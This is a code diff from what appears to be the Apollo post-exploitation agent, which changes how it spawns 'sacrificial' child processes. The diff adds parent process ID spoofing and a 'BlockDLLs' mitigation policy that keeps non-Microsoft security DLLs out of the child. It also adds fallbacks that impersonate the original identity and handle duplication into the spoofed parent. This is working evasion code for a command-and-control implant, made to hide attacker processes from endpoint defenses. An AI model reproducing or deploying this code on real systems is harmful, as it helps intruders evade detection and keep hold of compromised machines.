@@ -60,7 +60,8 @@ namespace Apollo.SacrificialProcesses
         public bool HasExited { get; private set; }
         public int ExitCode { get; private set; }
         public uint PID { get; private set; }
-        public IntPtr Handle { get; private set; }
+        private SafeFileHandle _hParentProc = null;
+        public SafeFileHandle Handle { get; private set; }
         public event EventHandler Exited;
 
         public string StdOut { get; private set; } = "";
@@ -85,11 +86,11 @@ namespace Apollo.SacrificialProcesses
         {
             bool bRet = false;
             securityAttributes.bInheritHandle = true;
-            //bRet = InitializeSecurityDescriptor(out SECURITY_DESCRIPTOR sd, 1);
-            //bRet = SetSecurityDescriptorDacl(ref sd, true, IntPtr.Zero, false);
-            //IntPtr pSd = Marshal.AllocHGlobal(Marshal.SizeOf(sd));
-            //Marshal.StructureToPtr(sd, pSd, false);
-            //securityAttributes.lpSecurityDescriptor = pSd;
+            bRet = InitializeSecurityDescriptor(out SECURITY_DESCRIPTOR sd, 1);
+            bRet = SetSecurityDescriptorDacl(ref sd, true, IntPtr.Zero, false);
+            IntPtr pSd = Marshal.AllocHGlobal(Marshal.SizeOf(sd));
+            Marshal.StructureToPtr(sd, pSd, false);
+            securityAttributes.lpSecurityDescriptor = pSd;
             bRet = CreatePipe(out hReadOut, out hWriteOut, securityAttributes, 0);
             if (!bRet)
                 throw new Win32Exception(Marshal.GetLastWin32Error());
@@ -119,88 +120,136 @@ namespace Apollo.SacrificialProcesses
                 processFlags |= CreateProcessFlags.CREATE_SUSPENDED;
             
             // Create process
-            startupInfo.cb = Marshal.SizeOf(startupInfo);
+            startupInfo.cb = Marshal.SizeOf(startupInfoEx);
             startupInfo.dwFlags = STARTF.STARTF_USESTDHANDLES | STARTF.STARTF_USESHOWWINDOW;
             // Wonder if this interferes with stdout?
             startupInfo.wShowWindow = 0;
-            
 
             var evasionArgs = Evasion.EvasionManager.GetSacrificialProcessStartupInformation();
-
-            
-            IntPtr hParentProc = OpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, evasionArgs.ParentProcessId);
-            IntPtr lpVal = Marshal.AllocHGlobal(IntPtr.Size);
-            IntPtr lpSize = IntPtr.Zero;
-
-            Marshal.WriteIntPtr(lpVal, hParentProc);
-            int dwAttributeCount = evasionArgs.BlockDlls ? 2 : 1;
-            var result1 = InitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeCount, 0, ref lpSize);
-            startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-            if (InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, dwAttributeCount, 0, ref lpSize))
+            // bad things happen if you're medium integrity and do ppid spoofing while under the effects of make_token
+            if (CredentialManager.OriginalIdentity != CredentialManager.CurrentIdentity)
             {
+                evasionArgs.ParentProcessId = System.Diagnostics.Process.GetCurrentProcess().Id;
+            }
 
-                // BlockDLLs
-                if (evasionArgs.BlockDlls)
+            _hParentProc = new SafeFileHandle(OpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, evasionArgs.ParentProcessId), false);
+            
+            if (_hParentProc.IsInvalid)
+            {
+                using (CredentialManager.OriginalIdentity.Impersonate())
+                    _hParentProc = new SafeFileHandle(OpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, evasionArgs.ParentProcessId), false);
+            }
+            if (!_hParentProc.IsInvalid)
+            {
+                IntPtr lpVal = Marshal.AllocHGlobal(IntPtr.Size);
+                IntPtr lpSize = IntPtr.Zero;
+
+                Marshal.WriteIntPtr(lpVal, _hParentProc.DangerousGetHandle());
+                int dwAttributeCount = evasionArgs.BlockDlls ? 2 : 1;
+                var result1 = InitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeCount, 0, ref lpSize);
+                startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+                if (bRet = InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, dwAttributeCount, 0, ref lpSize))
                 {
-                    var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
 
-                    Marshal.WriteInt64(
-                        lpMitigationPolicy,
-                        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
-                        );
+                    // BlockDLLs
+                    if (evasionArgs.BlockDlls)
+                    {
+                        var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
 
-                    UpdateProcThreadAttribute(
-                        startupInfoEx.lpAttributeList,
-                        0,
-                        (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
-                        lpMitigationPolicy,
-                        (IntPtr)IntPtr.Size,
-                        IntPtr.Zero,
-                        IntPtr.Zero
-                        );
+                        Marshal.WriteInt64(
+                            lpMitigationPolicy,
+                            PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+                            );
+
+                        bRet = UpdateProcThreadAttribute(
+                            startupInfoEx.lpAttributeList,
+                            0,
+                            (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                            lpMitigationPolicy,
+                            (IntPtr)IntPtr.Size,
+                            IntPtr.Zero,
+                            IntPtr.Zero
+                            );
+                    }
+
+                    if (bRet = UpdateProcThreadAttribute(
+                    startupInfoEx.lpAttributeList,
+                    0,
+                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                    lpVal,
+                    (IntPtr)IntPtr.Size,
+                    IntPtr.Zero,
+                    IntPtr.Zero))
+                    {
+                        try
+                        {
+                            bRet = DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
+                                hWriteOut,
+                                _hParentProc,
+                                ref hDupWriteOut,
+                                0,
+                                true,
+                                DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                            bRet = DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
+                                hWriteErr,
+                                _hParentProc,
+                                ref hDupWriteErr,
+                                0,
+                                true,
+                                DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                        } catch (Exception ex)
+                        {
+                            try
+                            {
+                                using (CredentialManager.OriginalIdentity.Impersonate())
+                                {
+                                    bRet = DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
+                                        hWriteOut,
+                                        _hParentProc,
+                                        ref hDupWriteOut,
+                                        0,
+                                        true,
+                                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                                    bRet = DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
+                                        hWriteErr,
+                                        _hParentProc,
+                                        ref hDupWriteErr,
+                                        0,
+                                        true,
+                                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
+                                }
+                            } catch (Exception ex2)
+                            {
+                                bRet = false;
+                            }
+                        }
+                        if (bRet)
+                        {
+                            startupInfo.hStdOutput = hDupWriteOut;
+                            startupInfo.hStdError = hDupWriteErr;
+                            startupInfo.hStdInput = hReadIn;
+                            startupInfoEx.StartupInfo = startupInfo;
+                            bRet = true;
+                        }
+                    }
+                    else
+                    {
+                        bRet = false;
+                    }
                 }
-
-                if (UpdateProcThreadAttribute(
-                startupInfoEx.lpAttributeList,
-                0,
-                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                lpVal,
-                (IntPtr)IntPtr.Size,
-                IntPtr.Zero,
-                IntPtr.Zero))
-                {
-                    processFlags |= CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT;
-                    DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
-                        hWriteOut,
-                        hParentProc,
-                        ref hDupWriteOut,
-                        0,
-                        true,
-                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
-                    DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
-                        hWriteErr,
-                        hParentProc,
-                        ref hDupWriteErr,
-                        0,
-                        true,
-                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
-                    startupInfo.hStdOutput = hDupWriteOut;
-                    startupInfo.hStdError = hDupWriteErr;
-                    startupInfo.hStdInput = hReadIn;
-                    startupInfoEx.StartupInfo = startupInfo;
-                } else
+                else
                 {
                     bRet = false;
+                }
+                if (!bRet)
+                {
+                    Marshal.FreeHGlobal(lpVal);
                 }
             } else
             {
                 bRet = false;
             }
-
-            if (!bRet)
-            {
-                Marshal.FreeHGlobal(lpVal);
-            }
+           
             return bRet;
         }
 
@@ -276,7 +325,7 @@ namespace Apollo.SacrificialProcesses
                         IntPtr.Zero,
                         IntPtr.Zero,
                         true,
-                        processFlags,
+                        processFlags | CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT,
                         unmanagedEnv,
                         null,
                         ref startupInfoEx,
@@ -289,7 +338,7 @@ namespace Apollo.SacrificialProcesses
                 if (!bRet)
                     throw new Win32Exception(Marshal.GetLastWin32Error());
 
-                Handle = processInfo.hProcess;
+                Handle = new SafeFileHandle(processInfo.hProcess, true);
                 PID = (uint)processInfo.dwProcessId;
                 StandardOutput = new StreamReader(new FileStream(hReadOut, FileAccess.Read), Console.OutputEncoding);
                 StandardError = new StreamReader(new FileStream(hReadErr, FileAccess.Read), Console.OutputEncoding);
@@ -372,7 +421,7 @@ namespace Apollo.SacrificialProcesses
                 IntPtr.Zero,
                 IntPtr.Zero,
                 true,
-                processFlags,
+                processFlags | CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT,
                 unmanagedEnv,
                 null,
                 ref startupInfoEx,
@@ -381,9 +430,8 @@ namespace Apollo.SacrificialProcesses
             dwError = Marshal.GetLastWin32Error();
             if (!success && dwError == Win32Error.ERROR_PRIVILEGE_NOT_HELD)
             {
-                
                 success = CreateProcessWithTokenW(
-                    hToken.DangerousGetHandle(),
+                    hToken,
                     LogonFlags.LOGON_NETCREDENTIALS_ONLY,
                     null,
                     command,
@@ -419,7 +467,7 @@ namespace Apollo.SacrificialProcesses
             if (!success)
                 throw new Win32Exception(dwError);
 
-            Handle = processInfo.hProcess;
+            Handle = new SafeFileHandle(processInfo.hProcess, true);
             PID = (uint)processInfo.dwProcessId;
             StandardOutput = new StreamReader(new FileStream(hReadOut, FileAccess.Read), Console.OutputEncoding);
             StandardError = new StreamReader(new FileStream(hReadErr, FileAccess.Read), Console.OutputEncoding);
@@ -569,6 +617,7 @@ namespace Apollo.SacrificialProcesses
                     DeleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
                     Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
                 }
+                DestroyEnvironmentBlock(unmanagedEnv);
             });
             thr.Start();
         }
